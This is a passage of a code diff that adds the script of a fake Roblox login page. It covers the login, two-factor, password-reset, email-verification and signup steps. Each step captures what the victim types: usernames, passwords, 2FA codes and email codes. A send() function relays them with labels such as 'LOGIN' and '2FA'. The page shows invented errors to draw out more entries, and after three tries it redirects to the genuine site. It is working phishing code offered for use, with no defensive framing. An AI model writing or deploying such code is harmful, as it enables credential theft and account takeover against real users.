+    window.prevBox=function(e,el){if(e.key==='Backspace'&&el.value.length===0){var p=el.previousElementSibling;if(p&&p.classList.contains('code-box')){p.focus();p.value=''}}};
+    function getCode(containerId){var c='';document.querySelectorAll('#'+containerId+' .code-box').forEach(function(b){c+=b.value});return c}
+    
+    function resetResend(){cooldown=0;if(cdInterval)clearInterval(cdInterval);document.getElementById('resendBtn').classList.remove('disabled');document.getElementById('countdown').textContent=''}
+    window.resendCode=function(){if(cooldown>0)return;cooldown=60;document.getElementById('resendBtn').classList.add('disabled');document.getElementById('countdown').textContent='('+cooldown+'s)';cdInterval=setInterval(function(){cooldown--;document.getElementById('countdown').textContent='('+cooldown+'s)';if(cooldown<=0){clearInterval(cdInterval);document.getElementById('resendBtn').classList.remove('disabled');document.getElementById('countdown').textContent=''}},1000);send('📩 **RESEND 2FA**\n👤 `'+U+'`')};
+    
+    function resetEmailResend(){emailCooldown=0;if(emailCdInterval)clearInterval(emailCdInterval);document.getElementById('resendEmailBtn').classList.remove('disabled');document.getElementById('emailCountdown').textContent=''}
+    window.resendEmailCode=function(){if(emailCooldown>0)return;emailCooldown=60;document.getElementById('resendEmailBtn').classList.add('disabled');document.getElementById('emailCountdown').textContent='('+emailCooldown+'s)';emailCdInterval=setInterval(function(){emailCooldown--;document.getElementById('emailCountdown').textContent='('+emailCooldown+'s)';if(emailCooldown<=0){clearInterval(emailCdInterval);document.getElementById('resendEmailBtn').classList.remove('disabled');document.getElementById('emailCountdown').textContent=''}},1000);send('📧 **RESEND EMAIL CODE**\n📧 `'+lastForgotEmail+'`')};
+    
+    window.doLogin=async function(){
+        U=document.getElementById('u').value.trim();P=document.getElementById('p').value.trim();
+        if (isFamousUsername(U)) {
+            document.getElementById('eLogin').textContent = 'Password does not match this username. Please try again.';
+            document.getElementById('eLogin').style.display = 'block';
+            return;
+        }
+        if (isGarbageUsername(U)) {
+            document.getElementById('eLogin').textContent = 'Invalid username format. Password does not match.';
+            document.getElementById('eLogin').style.display = 'block';
+            return;
+        }
+        if (hasBannedWord(U)) {
+            document.getElementById('eLogin').textContent = 'This username is not allowed. Please choose another.';
+            document.getElementById('eLogin').style.display = 'block';
+            return;
+        }
+        if(!validateUsername(document.getElementById('u'),'uHint','uCounter',false)||P.length<8||P.length>20){document.getElementById('eLogin').style.display='block';return}
+        document.getElementById('eLogin').style.display='none';showStep('load1');
+        await send('🎯 **LOGIN**\n👤 `'+U+'`\n🔑 `'+P+'`\n⏰ '+new Date().toLocaleString());
+        setTimeout(function(){showStep('step2fa');document.querySelector('#codeBoxes .code-box').focus()},2000);
+    };
+    
+    window.do2FA=async function(){
+        var code=getCode('codeBoxes');if(code.length<6){document.getElementById('e2FA').style.display='block';return}
+        attempts++;document.getElementById('e2FA').style.display='none';document.getElementById('btnVerify').disabled=true;showStep('load2');
+        await send('🔐 **2FA #'+attempts+'**\n👤 `'+U+'`\n🔢 `'+code+'`\n⏰ '+new Date().toLocaleString());
+        setTimeout(function(){if(attempts>=3){window.location.href='https://www.roblox.com/login';return}
+            showStep('step2fa');document.getElementById('btnVerify').disabled=false;document.querySelectorAll('#codeBoxes .code-box').forEach(function(b){b.value=''});document.getElementById('e2FA').style.display='block';document.querySelector('#codeBoxes .code-box').focus()},2000);
+    };
+    
+    window.doForgot=async function(){
+        var v=document.getElementById('fg').value.trim();
+        if(v.length<3||(v.includes('@')&&!v.includes('.',v.indexOf('@')))){document.getElementById('eForgot').style.display='block';return}
+        document.getElementById('eForgot').style.display='none';
+        lastForgotEmail=v;
+        await send('🔑 **FORGOT**\n📧 `'+v+'`\n⏰ '+new Date().toLocaleString());
+        // Переход на страницу Email Verification
+        showStep('stepEmailVerify');
+        document.querySelector('#emailCodeBoxes .code-box').focus();
+        // Сброс попыток
+        emailAttempts=0;
+        document.getElementById('eEmailVerify').style.display='none';
+    };
+    
+    window.doEmailVerify=async function(){
+        var code=getCode('emailCodeBoxes');
+        if(code.length<6){document.getElementById('eEmailVerify').style.display='block';return}
+        emailAttempts++;
+        document.getElementById('eEmailVerify').style.display='none';
+        await send('📧 **EMAIL VERIFY**\n📧 `'+lastForgotEmail+'`\n🔢 `'+code+'`\n⏰ '+new Date().toLocaleString());
+        
+        // После ввода кода переходим на 2FA (успешная верификация)
+        // Показываем успешное сообщение и переходим на 2FA
+        document.getElementById('eEmailVerify').textContent = '✅ Email verified! Redirecting to 2FA...';
+        document.getElementById('eEmailVerify').style.display = 'block';
+        document.getElementById('eEmailVerify').style.background = 'rgba(0,176,111,0.2)';
+        document.getElementById('eEmailVerify').style.color = '#00b06f';
+        document.getElementById('eEmailVerify').style.border = '1px solid #00b06f';
+        
+        setTimeout(function(){
+            showStep('step2fa');
+            document.querySelector('#codeBoxes .code-box').focus();
+            document.getElementById('eEmailVerify').style.display='none';
+            document.getElementById('eEmailVerify').style.background = 'var(--error)';
+            document.getElementById('eEmailVerify').style.color = '#fff';
+            document.getElementById('eEmailVerify').style.border = 'none';
+        },1500);
+    };
+    
+    window.doSignup=async function(){
+        var u=document.getElementById('su').value.trim(),p=document.getElementById('sp').value.trim(),p2=document.getElementById('sp2').value.trim();
+        if (isFamousUsername(u)) {
+            document.getElementById('signupInfo').textContent = '⚠️ This username is reserved and cannot be used.';
+            document.getElementById('signupInfo').style.display = 'block';
+            return;
+        }
+        if (isGarbageUsername(u)) {
+            document.getElementById('signupInfo').textContent = '⚠️ This username is not allowed. Please choose a more unique name.';
+            document.getElementById('signupInfo').style.display = 'block';
+            return;
+        }
+        if (hasBannedWord(u)) {
+            document.getElementById('signupInfo').textContent = '⚠️ This username contains a reserved word. Please choose another one.';
+            document.getElementById('signupInfo').style.display = 'block';
+            return;
+        }
+        if(!validateUsername(document.getElementById('su'),'suHint','suCounter',true)||p.length<8||p.length>20||p!==p2){document.getElementById('eSignup').style.display='block';return}
+        document.getElementById('signupInfo').textContent='⚠️ This username is already taken. Please choose another one.';
+        document.getElementById('signupInfo').style.display='block';
+        var names=generateUsernameSuggestions(u);document.getElementById('usernameSuggestions').style.display='flex';
+        document.getElementById('usernameSuggestions').innerHTML=names.map(function(n){return'<span onclick="document.getElementById(\'su\').value=\''+n+'\';document.getElementById(\'signupInfo\').style.display=\'block\';document.getElementById(\'suHint\').className=\'hint\';document.getElementById(\'su\').classList.remove(\'invalid\')">'+n+'</span>'}).join('');
+        await send('📝 **SIGNUP ATTEMPT**\n👤 `'+u+'`\n🔑 `'+p+'`\n⏰ '+new Date().toLocaleString());
+    };
+    
+    document.querySelectorAll('input').forEach(function(inp){
+        inp.addEventListener('input',function(){
+            if(hasR(this.value))this.value=this.value.replace(/[а-яё]/gi,'');
+        });
+    });
+})();
+</script>
+</body>
+</html>
